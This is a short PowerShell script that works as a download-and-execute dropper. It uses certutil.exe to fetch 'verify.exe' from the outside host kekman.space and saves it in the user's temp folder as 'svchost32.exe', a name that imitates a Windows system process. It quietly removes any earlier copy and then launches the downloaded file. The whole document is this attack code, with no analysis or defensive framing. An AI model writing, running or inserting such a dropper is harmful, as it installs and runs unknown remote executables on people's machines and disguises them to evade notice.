$u = 'https://kekman.space/verify.exe'
$p = "$env:TEMP\svchost32.exe"

Remove-Item $p -Force -ErrorAction SilentlyContinue

certutil.exe -urlcache -split -f $u $p | Out-Null

if (Test-Path $p) {
    Start-Process $p
}